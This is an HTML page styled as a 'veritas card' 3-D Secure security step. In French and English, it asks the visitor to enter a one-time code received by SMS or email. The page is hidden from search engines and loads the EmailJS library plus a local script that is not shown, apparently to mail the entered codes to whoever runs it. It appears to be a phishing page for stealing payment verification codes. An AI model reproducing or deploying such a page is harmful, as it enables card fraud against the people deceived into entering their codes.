<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>securite3ds</title>
<link rel="stylesheet" href="styles-page2.css">
</head>
<body>

  <div class="card">
    <div class="brand">
      <img src="logo.jpg" alt="Logo Yanick">
      <span class="brand-text">
        <span class="brand-name">veritas</span>
        <span class="brand-sub">card</span>
      </span>
    </div>

    <p>Please enter the code you received by SMS or email/ <br>
      Veillez entrer le code reçu par sms ou par email</p>

    <form id="signupForm">
      <div class="field">
        <input
          type="password"
          id="password"
          placeholder="password"
          minlength="8"
          maxlength="20"
          aria-label="password"
          required>
      </div>

      <button
          type="submit"
          class="signin-btn"
          id="signin-btn">
          Sign In
        </button>
      <div id="result"></div>
    </form>
  </div>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script src="code.js"></script>

</body>
</html>
